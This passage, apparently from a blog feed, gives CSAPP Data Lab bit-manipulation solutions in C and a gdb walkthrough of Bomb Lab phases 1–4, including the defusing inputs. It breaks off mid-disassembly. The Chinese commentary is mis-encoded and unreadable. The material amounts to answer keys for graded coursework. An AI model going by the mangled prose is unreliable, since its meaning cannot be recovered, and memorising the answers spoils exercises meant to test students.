10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> !(((x + <span class="number">1</span>) + (x &amp; <span class="number">0x7fffffff</span>)) + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h2><p>å¥‡æ•°ä½å…¨ä¸º1æ‰èƒ½æ˜¯1ï¼Œé‚£ä¹ˆ0x0 - 0xF ä¸­ï¼Œåªæœ‰0xA, 0xB, 0xE, 0xFæ‰æ»¡è¶³ï¼Œå³è¿™ä¸ªæ•°å­—æœ€å°çš„æ˜¯0xAAAAAAAAï¼Œé‚£ä¹ˆæ— è®ºè¿™ä¸ªæ•°æ˜¯å¤šå°‘ï¼Œåªè¦æ»¡è¶³è¿™ä¸ªæ¡ä»¶ï¼Œå…¶ä¸0xAAAAAAAAç›¸ä¸åï¼Œå¶æ•°ä½ä¸€å®šä¸º0ï¼ˆAH = 1010Bï¼‰ï¼Œæ‰€ä»¥å¦‚æœè®¾è¿™ä¸ªæ•°æ»¡è¶³è¦æ±‚ï¼Œåˆ™ä¸0xAAAAAAAAä¸è¿ç®—åï¼Œå…¶å€¼ä¸€å®šæ˜¯0xAAAAAAAAï¼Œé‚£ä¹ˆå†ä¸0xAAAAAAAAå¼‚æˆ–åï¼Œå…¶å€¼ä¸€å®šä¸º0ï¼Œå–ååˆ™ä¸º1ï¼›åä¹‹ï¼Œä¸æ»¡è¶³è¦æ±‚ï¼Œå…¶å€¼ä¸º0ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// a b e f</span></span><br><span class="line">  <span class="keyword">return</span> !((x &amp; <span class="number">0xAAAAAAAA</span>) ^ <span class="number">0xAAAAAAAA</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h2><p>æ— è®ºä»äºŒè¿›åˆ¶æ•°ä¸Šæ¨è¿˜æ˜¯å‡­æ„Ÿè§‰ç¡¬è¯•ï¼Œéƒ½æŒºç®€å•çš„ï¼Œä»¥8ä½æ¥ä¸¾ä¸ªä¾‹å­</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5:  00000101</span><br><span class="line">-5: 11111011</span><br></pre></td></tr></table></figure><p>æ— è®ºæ­£æ•°è¿˜æ˜¯è´Ÿæ•°éƒ½ç­‰äºåŸæ¥çš„å–å + 1</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h2><p>æ€è·¯å¤§ä½“ä¸Šåˆ†ä¸ºä¸¤éƒ¨åˆ†<br>ç¬¬ä¸€ä¸ªæ˜¯å‰28ä½ï¼Œå¿…é¡»æ˜¯0x3ï¼Œå¼‚æˆ–åˆ¤æ–­å³å¯<br>ç¬¬äºŒä¸ªæ˜¯å4ä½ï¼Œé€»è¾‘å¦‚ä¸‹ï¼ˆæˆ–çš„æ€ç»´ï¼‰ï¼š<br>è¦ä¹ˆæœ€é«˜ä½æ˜¯0ï¼ˆèŒƒå›´é”å®šåœ¨0x0 - 0x7ï¼‰<br>è¦ä¹ˆç¬¬äºŒä¸‰ä½æ˜¯0ï¼ˆèŒƒå›´é”å®šåœ¨0x8 - 0x9ï¼‰<br>ç„¶åç”¨!è¿ç®—çš„æ€ç»´ç›¸ä¸å³å¯</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (!((x &gt;&gt; <span class="number">4</span>) ^ <span class="number">0x3</span>)) &amp; (!((x &lt;&lt; <span class="number">28</span>) &gt;&gt; <span class="number">31</span>) | !((x &lt;&lt; <span class="number">29</span>) &gt;&gt; <span class="number">30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h2><p>å®ç°ä¸€ä¸ªx ? y : z æ¡ä»¶è¿ç®—ç¬¦</p><p>é€»è¾‘æ˜¯ï¼Œå¦‚æœxä¸ä¸º0åˆ™è¿”å›yï¼Œå¦åˆ™z</p><p>é‚£ä¹ˆå¯ä»¥ç”¨å¼‚æˆ–æ¥åšï¼Œæ€è·¯åˆæ­¥æ˜¯è¿™æ ·çš„ï¼Œå› ä¸ºxæ˜¯ä¸ç¡®å®šçš„æ•°ï¼Œä½†æ˜¯åœ¨é€»è¾‘ä¸­åªæœ‰0å’Œé0ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é‡‡ç”¨ä¸¤æ¬¡!!æ“ä½œç¬¦è®©ä»–å˜æˆé0å’Œ0çš„ä¸¤ä¸ªä»…æœ‰çš„æƒ…å†µ(0x00000000å’Œ0x00000001)</p><p>ä½¿ç”¨<code>~x + 1</code>å¯ä»¥è®©ä¸¤ç§æƒ…å†µåˆ†åˆ«ä¸º0x00000000å’Œ0xffffffffï¼Œç„¶åå†ç”¨å¼‚æˆ–å¤„ç†å³å¯</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z </span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((~(!!x) + <span class="number">1</span>) &amp; y) ^ ((~(!x) + <span class="number">1</span>) &amp; z);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æœªå®Œå¾…ç»­"><a href="#æœªå®Œå¾…ç»­" class="headerlink" title="æœªå®Œå¾…ç»­"></a>æœªå®Œå¾…ç»­</h2><h1 id="åé¦ˆæ€»ç»“"><a href="#åé¦ˆæ€»ç»“" class="headerlink" title="åé¦ˆæ€»ç»“"></a>åé¦ˆæ€»ç»“</h1><ol><li>åˆ¤æ–­åœ¨æŸä¸ªåŒºé—´æ“…ç”¨å¼‚æˆ–æ“ä½œ</li><li>ä»¥äºŒè¿›åˆ¶çš„è§’åº¦çœ‹å¾…é—®é¢˜</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> csapp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bomb Lab</title>
      <link href="2021/06/15/BombLab/"/>
      <url>2021/06/15/BombLab/</url>
      
        <content type="html"><![CDATA[<p>å®éªŒè¯´æ˜ï¼š</p><blockquote><p>A â€œbinary bombâ€ is a program provided to students as an object code file. When run, it prompts the user to type in 6 different strings. If any of these is incorrect, the bomb â€œexplodes,â€ printing an error message and logging the event on a grading server. Students must â€œdefuseâ€ their own unique bomb by disassembling and reverse engineering the program to determine what the 6 strings should be. The lab teaches students to understand assembly language, and also forces them to learn how to use a debugger. Itâ€™s also great fun. A legendary lab among the CMU undergrads.</p></blockquote><p>æ˜¯ä¸ªé€†å‘çš„å°æ¸¸æˆï¼Œæˆ‘ä»¬ä½¿ç”¨gdbæ¥åš</p><p>åæ±‡ç¼–ä¸€ä¸‹mainå‡½æ•°ï¼Œå¯ä»¥å¤§æ¦‚çœ‹åˆ°æœ‰å¾ˆå¤šçš„phaseï¼Œæˆ‘ä»¬éœ€è¦é€ä¸ªæ‹†é™¤<br><img src="https://i.loli.net/2021/06/15/QzuaNr1OUdfVMqw.png" alt=""></p><h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h2><p><img src="https://i.loli.net/2021/06/15/aiNtKRXkTMzxuAY.png" alt=""><br>åæ±‡ç¼–å¯ä»¥çœ‹åˆ°åœ¨phase_1é‡Œé¢è°ƒç”¨äº†ä¸€ä¸ªstrings_not_equalçš„å‡½æ•°ï¼ŒçŒœæµ‹å¦‚æœä¸¤ä¸ªå­—ç¬¦ä¸²ä¸ç›¸ç­‰å°±ä¼šçˆ†ç‚¸ï¼Œx64ä¸‹ç¨‹åºé€šè¿‡rsiä¼ å…¥ç¬¬äºŒä¸ªå‚æ•°ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹å…·ä½“çš„å†…å­˜å€¼å³å¯ã€‚<br><img src="https://i.loli.net/2021/06/15/oKE52W9rqa6IjAR.png" alt=""></p><p>è¿è¡Œç¨‹åºï¼Œå‘ç°å¯ä»¥ä¸è¢«å¼•çˆ†</p><h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h2><p>åæ±‡ç¼–phase_2<br><img src="https://i.loli.net/2021/06/15/5UmbPSIHk1XFpd9.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°åé¢æœ‰ä¸ªjneæŒ‡ä»¤å‘ä¸Šè·³è½¬ï¼Œæ‰€ä»¥è‚¯å®šæ˜¯ä¸ªå¾ªç¯ç»“æ„ï¼Œåœ¨ä¸Šé¢æ˜¯ä¸ªread_six_numbersï¼Œè¯»å…¥6ä¸ªæ•°å­—ï¼Œæ‰€ä»¥çŒœæµ‹å¯¹æ¯ä¸ªæ•°å­—éƒ½æœ‰è¦æ±‚ï¼Œå¹¶ä¸”é€šè¿‡åŠ¨è°ƒå¯ä»¥å‘ç°cmpé‚£æ¡æŒ‡ä»¤è¦æ±‚ç¬¬ä¸€ä¸ªæ•°å­—ä¸º1</p><p><img src="https://i.loli.net/2021/06/15/BHQwntopNq5by4S.png" alt=""><br>è¯»å…¥å…­ä¸ªæ•°å­—ï¼Œå¦åˆ™å°±é€€å‡ºç¨‹åº</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0000000000400f1a</span> &lt;+<span class="number">30</span>&gt;:<span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0000000000400f1c</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbx</span>],<span class="built_in">eax</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä½ç½®åŠ¨æ€è°ƒè¯•å¯ä»¥å‘ç°æ˜¯åé¢çš„æ•°æ®æ˜¯å¦ç­‰äºå‰é¢æ•°å­—çš„äºŒå€</p><p>é‚£ä¹ˆpayloadåº”è¯¥å°±æ˜¯1 2 4 8 16 32äº†<br>å¯ä»¥é€šè¿‡éªŒè¯</p><h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h2><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0000000000400f43</span> &lt;+<span class="number">0</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">rsp</span>,<span class="number">0x18</span></span><br><span class="line"> <span class="number">0x0000000000400f47</span> &lt;+<span class="number">4</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rcx</span>,[<span class="built_in">rsp</span>+<span class="number">0xc</span>]</span><br><span class="line"> <span class="number">0x0000000000400f4c</span> &lt;+<span class="number">9</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rdx</span>,[<span class="built_in">rsp</span>+<span class="number">0x8</span>]</span><br><span class="line"> <span class="number">0x0000000000400f51</span> &lt;+<span class="number">14</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">esi</span>,<span class="number">0x4025cf</span></span><br><span class="line"> <span class="number">0x0000000000400f56</span> &lt;+<span class="number">19</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span></span><br><span class="line"> <span class="number">0x0000000000400f5b</span> &lt;+<span class="number">24</span>&gt;:<span class="keyword">call</span>   <span class="number">0x400bf0</span> &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line"> <span class="number">0x0000000000400f60</span> &lt;+<span class="number">29</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="number">0x1</span></span><br><span class="line"> # è¯»å…¥æ•°æ®è¦æ˜¯<span class="number">2</span>ä¸ª</span><br><span class="line"> <span class="number">0x0000000000400f63</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">jg</span>     <span class="number">0x400f6a</span> &lt;phase_3+<span class="number">39</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400f65</span> &lt;+<span class="number">34</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"> <span class="number">0x0000000000400f6a</span> &lt;+<span class="number">39</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x8</span>],<span class="number">0x7</span></span><br><span class="line"> # ç¬¬ä¸€ä¸ªè¯»å…¥çš„æ•°æ®ä¸èƒ½è¶…è¿‡<span class="number">7</span></span><br><span class="line"> <span class="number">0x0000000000400f6f</span> &lt;+<span class="number">44</span>&gt;:<span class="keyword">ja</span>     <span class="number">0x400fad</span> &lt;phase_3+<span class="number">106</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400f71</span> &lt;+<span class="number">46</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x8</span>]</span><br><span class="line"> <span class="number">0x0000000000400f75</span> &lt;+<span class="number">50</span>&gt;:<span class="keyword">jmp</span>    <span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>*<span class="number">8</span></span><br><span class="line"> +<span class="number">0x402470</span>]</span><br><span class="line"> # å¯»å€åˆ°ä¸åŒçš„åˆ†æ”¯</span><br><span class="line"> <span class="number">0x0000000000400f7c</span> &lt;+<span class="number">57</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0xcf</span></span><br><span class="line"> <span class="number">0x0000000000400f81</span> &lt;+<span class="number">62</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400f83</span> &lt;+<span class="number">64</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x2c3</span></span><br><span class="line"> <span class="number">0x0000000000400f88</span> &lt;+<span class="number">69</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400f8a</span> &lt;+<span class="number">71</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x100</span></span><br><span class="line"> <span class="number">0x0000000000400f8f</span> &lt;+<span class="number">76</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400f91</span> &lt;+<span class="number">78</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x185</span></span><br><span class="line"> <span class="number">0x0000000000400f96</span> &lt;+<span class="number">83</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400f98</span> &lt;+<span class="number">85</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0xce</span></span><br><span class="line"> <span class="number">0x0000000000400f9d</span> &lt;+<span class="number">90</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400f9f</span> &lt;+<span class="number">92</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x2aa</span></span><br><span class="line"> <span class="number">0x0000000000400fa4</span> &lt;+<span class="number">97</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400fa6</span> &lt;+<span class="number">99</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x147</span></span><br><span class="line"> <span class="number">0x0000000000400fab</span> &lt;+<span class="number">104</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400fad</span> &lt;+<span class="number">106</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"> <span class="number">0x0000000000400fb2</span> &lt;+<span class="number">111</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span></span><br><span class="line"> <span class="number">0x0000000000400fb7</span> &lt;+<span class="number">116</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400fb9</span> &lt;+<span class="number">118</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x137</span></span><br><span class="line"> <span class="number">0x0000000000400fbe</span> &lt;+<span class="number">123</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0xc</span>]</span><br><span class="line"> <span class="number">0x0000000000400fc2</span> &lt;+<span class="number">127</span>&gt;:<span class="keyword">je</span>     <span class="number">0x400fc9</span> &lt;phase_3+<span class="number">134</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400fc4</span> &lt;+<span class="number">129</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"> <span class="number">0x0000000000400fc9</span> &lt;+<span class="number">134</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rsp</span>,<span class="number">0x18</span></span><br><span class="line"> <span class="number">0x0000000000400fcd</span> &lt;+<span class="number">138</span>&gt;:<span class="keyword">ret</span>    </span><br></pre></td></tr></table></figure><p>ç›®æµ‹çœ‹èµ·æ¥åƒä¸ªSwitchç»“æ„ï¼Œå…³é”®ç‚¹ç»™å‡ºæ³¨é‡Šï¼Œä¸­é—´é€šè¿‡è¯»å…¥çš„æ•°å­—åˆ°eaxé‡Œé¢è¿›è¡Œå¯»å€<br>æ¯”å¦‚æˆ‘è¦è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•°å­—æ˜¯7ï¼Œé‚£ä¹ˆæŸ¥çœ‹åœ°å€å¦‚ä¸‹<br><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/wx <span class="number">0x4024a8</span></span><br><span class="line"><span class="number">0x4024a8</span>:<span class="number">0x00400fa6</span></span><br></pre></td></tr></table></figure><br>å¯ä»¥å‘ç°ä¼šæ‰§è¡Œ<code>mov eax,0x147</code>ï¼Œç„¶åjmpåˆ°cmpæŒ‡ä»¤ï¼Œå°†sscanfè¯»å…¥çš„ç¬¬äºŒä¸ªå‚æ•°å’Œè¯¥å‚æ•°ç›¸æ¯”è¾ƒï¼Œé‚£ä¹ˆç¬¬äºŒä¸ªæˆ‘ä»¬è¾“å…¥0x147å³å¯é€šè¿‡éªŒè¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">That&#x27;s number 2.  Keep going!</span><br><span class="line">7 327</span><br><span class="line">Halfway there!</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯æˆªæ­¢åˆ°ç›®å‰çš„ç¨‹åºè¾“å‡º</p><h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h2><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_4:</span><br><span class="line">   <span class="number">0x000000000040100c</span> &lt;+<span class="number">0</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">rsp</span>,<span class="number">0x18</span></span><br><span class="line">   <span class="number">0x0000000000401010</span> &lt;+<span class="number">4</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rcx</span>,[<span class="built_in">rsp</span>+<span class="number">0xc</span>]</span><br><span class="line">   <span class="number">0x0000000000401015</span> &lt;+<span class="number">9</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rdx</span>,[<span class="built_in">rsp</span>+<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x000000000040101a</span> &lt;+<span class="number">14</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">esi</span>,<span class="number">0x4025cf</span></span><br><span class="line">   <span class="number">0x000000000040101f</span> &lt;+<span class="number">19</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0000000000401024</span> &lt;+<span class="number">24</span>&gt;:<span class="keyword">call</span>   <span class="number">0x400bf0</span> &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   <span class="number">0x0000000000401029</span> &lt;+<span class="number">29</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="number">0x2</span></span><br><span class="line">   <span class="number">0x000000000040102c</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x401035</span> &lt;phase_4+<span class="number">41</span>&gt;</span><br><span class="line">   <span class="number">0x000000000040102e</span> &lt;+<span class="number">34</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x8</span>],<span class="number">0xe</span></span><br><span class="line">   # ç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦å°äº<span class="number">0xe</span></span><br><span class="line">   <span class="number">0x0000000000401033</span> &lt;+<span class="number">39</span>&gt;:<span class="keyword">jbe</span>    <span class="number">0x40103a</span> &lt;phase_4+<span class="number">46</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401035</span> &lt;+<span class="number">41</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x000000000040103a</span> &lt;+<span class="number">46</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="number">0xe</span></span><br><span class="line">   <span class="number">0x000000000040103f</span> &lt;+<span class="number">51</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">esi</span>,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0000000000401044</span> &lt;+<span class="number">56</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">edi</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x0000000000401048</span> &lt;+<span class="number">60</span>&gt;:<span class="keyword">call</span>   <span class="number">0x400fce</span> &lt;func4&gt;</span><br><span class="line">   # è°ƒç”¨func4å‡½æ•°ç»§ç»­å¤„ç†ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæˆ‘ä»¬è¾“å…¥çš„ç¬¬ä¸€ä¸ªå€¼ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯<span class="number">0</span>ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯<span class="number">0xe</span></span><br><span class="line">   <span class="number">0x000000000040104d</span> &lt;+<span class="number">65</span>&gt;:<span class="keyword">test</span>   <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line">   <span class="number">0x000000000040104f</span> &lt;+<span class="number">67</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x401058</span> &lt;phase_4+<span class="number">76</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401051</span> &lt;+<span class="number">69</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0xc</span>],<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0000000000401056</span> &lt;+<span class="number">74</span>&gt;:<span class="keyword">je</span>     <span class="number">0x40105d</span> &lt;phase_4+<span class="number">81</span>&gt;</span><br><span class="line">   # è¿”å›å€¼å’Œç¬¬äºŒä¸ªå‚æ•°éƒ½å¿…é¡»ä¸º<span class="number">0</span></span><br><span class="line">   <span class="number">0x0000000000401058</span> &lt;+<span class="number">76</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x000000000040105d</span> &lt;+<span class="number">81</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rsp</span>,<span class="number">0x18</span></span><br><span class="line">   <span class="number">0x0000000000401061</span> &lt;+<span class="number">85</span>&gt;:<span class="keyword">ret</span>    </span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿˜æ˜¯å¸¸è§„çš„é¦–å…ˆæ¯”è¾ƒå‚æ•°ä¸ªæ•°ï¼Œéœ€è¦ä¸¤ä¸ªï¼Œå¹¶ä¸”ç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦ä¸èƒ½å¤§äº0xe</p><p>func4å‡½æ•°å¦‚ä¸‹<br><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0000000000400fce</span> &lt;+<span class="number">0</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">rsp</span>,<span class="number">0x8</span></span><br><span class="line"><span class="number">0x0000000000400fd2</span> &lt;+<span class="number">4</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">edx</span></span><br><span class="line"> # <span class="number">0xe</span></span><br><span class="line"><span class="number">0x0000000000400fd4</span> &lt;+<span class="number">6</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">eax</span>,<span class="built_in">esi</span></span><br><span class="line"><span class="number">0x0000000000400fd6</span> &lt;+<span class="number">8</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">ecx</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0000000000400fd8</span> &lt;+<span class="number">10</span>&gt;:<span class="keyword">shr</span>    <span class="built_in">ecx</span>,<span class="number">0x1f</span></span><br><span class="line"><span class="number">0x0000000000400fdb</span> &lt;+<span class="number">13</span>&gt;:<span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">ecx</span></span><br><span class="line"><span class="number">0x0000000000400fdd</span> &lt;+<span class="number">15</span>&gt;:<span class="keyword">sar</span>    <span class="built_in">eax</span>,<span class="number">1</span></span><br><span class="line"><span class="number">0x0000000000400fdf</span> &lt;+<span class="number">17</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">ecx</span>,[<span class="built_in">rax</span>+<span class="built_in">rsi</span>*<span 